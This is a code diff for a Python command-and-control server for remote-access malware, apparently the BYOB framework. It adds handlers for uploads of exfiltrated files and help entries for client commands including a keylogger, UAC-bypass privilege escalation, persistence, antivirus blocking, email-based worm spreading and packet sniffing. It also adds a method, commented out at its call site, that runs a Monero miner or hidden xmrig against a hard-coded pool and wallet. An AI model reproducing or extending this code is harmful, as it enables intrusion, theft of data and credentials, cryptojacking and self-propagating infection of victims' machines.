@@ -95,24 +95,6 @@ def main():
         help='SQLite database')
 
     parser.add_argument(
-        '--imgur',
-        action='store',
-        type=str,
-        help='Imgur API key')
-
-    parser.add_argument(
-        '--pastebin',
-        action='store',
-        type=str,
-        help='Pastebin API key')
-
-    parser.add_argument(
-        '--ftp',
-        action='append',
-        nargs=3,
-        help='FTP hostname username password')
-
-    parser.add_argument(
         '--debug',
         action='store_true',
         help='Additional logging'
@@ -146,10 +128,19 @@ def main():
 
     options = parser.parse_args()
     tmp_file=open("temp","w")
+    
     globals()['debug'] = options.debug
+
+    # host Python packages on C2 port + 2 (for clients to remotely import)
     globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+
+    # host BYOB modules on C2 port + 1 (for clients to remotely import)
     globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+
+    # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
     globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
+
+    # run C2
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
 
@@ -186,6 +177,7 @@ class C2():
         self._count = 0
         self._prompt = None
         self._database = db
+        self.child_procs = {}
         self.current_session = None
         self.sessions = {}
         self.socket = self._socket(port)
@@ -254,7 +246,114 @@ class C2():
             'tasks' : {
                 'method': self.task_list,
                 'usage': 'tasks [id]',
-                'description': 'display all incomplete tasks for a client (default: all clients)'}}
+                'description': 'display all incomplete tasks for a client (default: all clients)'},
+            'abort': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'abort execution and self-destruct',
+                'usage': 'abort'},
+            'cat': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'display file contents', 
+                'usage': 'cat <path>'},
+            'cd': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'change current working directory',
+                'usage': 'cd <path>'},
+            'escalate': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'attempt uac bypass to escalate privileges',
+                'usage': 'escalate'},
+            'eval': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'execute python code in current context',
+                'usage': 'eval <code>'},
+            'execute': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'run an executable program in a hidden process',
+                'usage': 'execute <path> [args]'},
+            'help': {
+                'method': self.help,
+                'description': 'show usage help for commands and modules',
+                'usage': 'help [cmd]'},
+            'icloud': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'check for logged in icloud account on macos',
+                'usage': 'icloud'},
+            'keylogger': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'log user keystrokes',
+                'usage': 'keylogger [mode]'},
+            'load': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'remotely import a module or package',
+                'usage': 'load <module> [target]'},
+            'ls': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'list the contents of a directory',
+                'usage': 'ls <path>'},
+            'miner': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'run cryptocurrency miner in the background',
+                'usage': 'miner <url> <user> <pass>'},
+            'outlook': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'access outlook email in the background',
+                'usage': 'outlook <option> [mode]'},
+            'packetsniffer': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'capture traffic on local network',
+                'usage': 'packetsniffer [mode]'},
+            'passive': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'keep client alive while waiting to re-connect',
+                'usage': 'passive'},
+            'persistence': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'establish persistence on client host machine',
+                'usage': 'persistence <add/remove> [method]'},
+            'portscanner': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'scan a target host or network to identify',
+                'usage': 'portscanner <target>'},
+            'process': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'block process (e.g. antivirus) or monitor process',
+                'usage': 'process <block/monitor>'},
+            'pwd': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'show name of present working directory',
+                'usage': 'pwd'},
+            'restart': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'restart the shell', 
+                'usage': 'restart [output]'},
+            'screenshot': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'capture a screenshot from host device',
+                'usage': 'screenshot'},
+            'show': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'show value of an attribute',
+                'usage': 'show <value>'},
+            'spread': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'activate worm-like behavior and begin spreading client via email',
+                'usage': 'spread <gmail> <password> <URL email list>'},
+            'stop': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'stop a running job', 
+                'usage': 'stop <job>'},
+            'upload': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'upload file from client machine to the c2 server',
+                'usage': 'upload [file]'},
+            'wget': {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'download file from url', 
+                'usage': 'wget <url>'}        
+        }
+
+        #self._init_dev_miner()
 
         try:
             import readline
@@ -353,6 +452,71 @@ class C2():
         with self._lock:
             return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
 
+
+    def _init_dev_miner(self):
+        url = 'pool.hashvault.pro'
+        host_port = 80
+        api_port = 8889
+        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
+
+        # first attempt using built-in python miner
+        try:
+            from core.miner import Miner
+            self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
+            self.child_procs['dev_miner_py'].start()
+        except Exception as e:
+            util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+
+            # if that fails, try downloading and running xmrig
+            try:
+                import multiprocessing
+                threads = multiprocessing.cpu_count()
+
+                # find correct executable for this platform
+                if sys.platform == 'linux':
+                    platform = 'linux2'
+                else:
+                    platform = sys.platform
+
+                xmrig_path = os.path.abspath('modules/xmrig/xmrig_' + platform)
+
+                if sys.platform == 'win32':
+                    os.rename(xmrig_path, xmrig_path + '.exe')
+
+                os.chmod(xmrig_path, 755)
+
+                # excute xmrig in hidden process
+                params = xmrig_path + " --url={url}:{host_port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, host_port=host_port, user=user, threads=threads)
+                result = self._execute(params)
+            except Exception as e:
+                util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+
+        # wait 2 seconds to allow for any console output from pyrx
+        time.sleep(2)
+
+
+    def _execute(self, args):
+        # ugly method that should be refactored at some point
+        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
+        args = [path] + args.split()
+        if os.path.isfile(path):
+            name = os.path.splitext(os.path.basename(path))[0]
+            try:
+                info = subprocess.STARTUPINFO()
+                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
+                info.wShowWindow = subprocess.SW_HIDE
+                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
+                return "Running '{}' in a hidden process".format(path)
+            except Exception as e:
+                try:
+                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    return "Running '{}' in a new process".format(name)
+                except Exception as e:
+                    util.log("{} error: {}".format(self.execute.__name__, str(e)))
+        else:
+            return "File '{}' not found".format(str(path))
+
+
     def debug(self, code):
         """
         Execute code directly in the context of the currently running process
@@ -374,9 +538,25 @@ class C2():
         Quit server and optionally keep clients alive
 
         """
+
+        # terminate handlers running on other ports
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
         globals()['post_handler'].terminate()
+
+        # kill subprocesses (subprocess.Popen)
+        for proc in self.child_procs.values():
+            try:
+                proc.kill()
+            except: pass
+
+        # kill child processes (multiprocessing.Process)
+        for child_proc in self.child_procs.values():
+            try:
+                child_proc.terminate()
+            except: pass
+        
+        # kill clients or keep alive (whichever user specifies)
         if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 if isinstance(session, Session):
@@ -386,11 +566,13 @@ class C2():
                     except: pass
         globals()['__abort'] = True
         self._active.clear()
+
+        # kill server and exit
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
         util.display('Exiting...')
         sys.exit(0)
 
-    def help(self, info=None):
+    def help(self, cmd=None):
         """
         Show usage information
 
@@ -400,7 +582,18 @@ class C2():
         """
         column1 = 'command <arg>'
         column2 = 'description'
-        info = json.loads(info) if info else {command['usage']: command['description'] for command in self.commands.values()}
+
+        # if a valid command is specified, display detailed help for it.
+        # otherwise, display help for all commands
+        if cmd:
+            if cmd in self.commands:
+                info = {self.commands[cmd]['usage']: self.commands[cmd]['description']} 
+            else:
+                util.display("'{cmd}' is not a valid command. Type 'help' to see all commands.".format(cmd=cmd))
+                return
+        else:
+            info = {command['usage']: command['description'] for command in self.commands.values()}
+
         max_key = max(map(len, list(info.keys()) + [column1])) + 2
         max_val = max(map(len, list(info.values()) + [column2])) + 2
         util.display('\n', end=' ')
@@ -408,6 +601,7 @@ class C2():
         for key in sorted(info):
             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         util.display("\n", end=' ')
+
 
     def display(self, info):
         """
@@ -841,10 +1035,16 @@ class C2():
                     output = ''
                     cmd, _, action = cmd_buffer.partition(' ')
                     if cmd in self.commands:
-                        try:
-                            output = self.commands[cmd]['method'](action) if len(action) else self.commands[cmd]['method']()
-                        except Exception as e1:
-                            output = str(e1)
+                        method = self.commands[cmd]['method']
+                        if callable(method):
+                            try:
+                                output = method(action) if len(action) else method()
+                            except Exception as e1:
+                                output = str(e1)
+                        else:
+                            util.display("\n[-]", color='red', style='bright', end=' ')
+                            util.display("Error:", color='white', style='bright', end=' ')
+                            util.display(method + "\n", color='white', style='normal')
                     elif cmd == 'cd':
                         try:
                             os.chdir(action)
@@ -896,7 +1096,7 @@ class Session(threading.Thread):
             self.info = self.client_info()
             #self.info['id'] = self.id
         except Exception as e:
-            print(bytes(e))
+            print("Session init exception: " + str(e))
             self.info = None
 
     def kill(self):
@@ -923,8 +1123,8 @@ class Session(threading.Thread):
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
         for key, val in info.items():
-            if bytes(val).startswith("_b64"):
-                info[key] = base64.b64decode(bytes(val[6:])).decode('ascii')
+            if str(val).startswith("_b64"):
+                info[key] = base64.b64decode(str(val[6:])).decode('ascii')
         return info
 
     def status(self):
@@ -995,7 +1195,6 @@ class Session(threading.Thread):
 
         """
         while True:
-            # try:
             if self._active.wait():
                 task = self.recv_task() if not self._prompt else self._prompt
                 if isinstance(task, dict):
@@ -1009,13 +1208,15 @@ class Session(threading.Thread):
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
-                        elif cmd in globals()['c2'].commands and cmd != 'help':
-                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
-                            if result:
-                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                                globals()['c2'].display(result.encode())
-                                globals()['c2'].database.handle_task(task)
-                            continue
+                        elif cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
+                            method = globals()['c2'].commands[cmd]['method']
+                            if callable(method):
+                                result = method(action) if len(action) else method()
+                                if result:
+                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                                    globals()['c2'].display(result.encode())
+                                    globals()['c2'].database.handle_task(task)
+                                continue
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                             self.send_task(task)
@@ -1029,9 +1230,7 @@ class Session(threading.Thread):
                     elif isinstance(task, int) and task == 0:
                         break
                 self._prompt = None
-#            except Exception as e:
-#                util.log(str(e))
-#                break
+
         time.sleep(1)
         globals()['c2'].session_remove(self.id)
         self._active.clear()
